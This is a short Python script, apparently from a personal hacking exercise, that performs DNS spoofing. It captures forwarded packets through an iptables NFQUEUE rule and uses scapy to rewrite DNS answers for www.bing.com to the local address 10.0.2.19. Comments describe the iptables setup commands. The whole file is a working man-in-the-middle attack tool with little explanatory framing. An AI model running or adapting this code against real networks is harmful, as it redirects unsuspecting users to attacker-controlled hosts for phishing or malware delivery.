# using Iptable tool in k-linux to put the forwarding packages in a que. Then I will enter the que to modify the packages.
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# To test locally. Change the chain from FORWARD to output and input.

# NB: remember to flush your iptables when you are done. iptables --flush
# user of the program needs to install netfilterqueue (pip install netfilterqueue)

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    target_url = "www.bing.com"
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target_url in qname:
            print("[+] Spoofing Target")
            print(scapy_packet.show())
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata="10.0.2.19") # sets the DNS answer to my redirect
            scapy_packet[scapy.DNS].ancount = 1 # sets the amount of answers to 1
            # Removes checksum/len. Scapy re-calcs this so it matches our changes to the DNS record.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()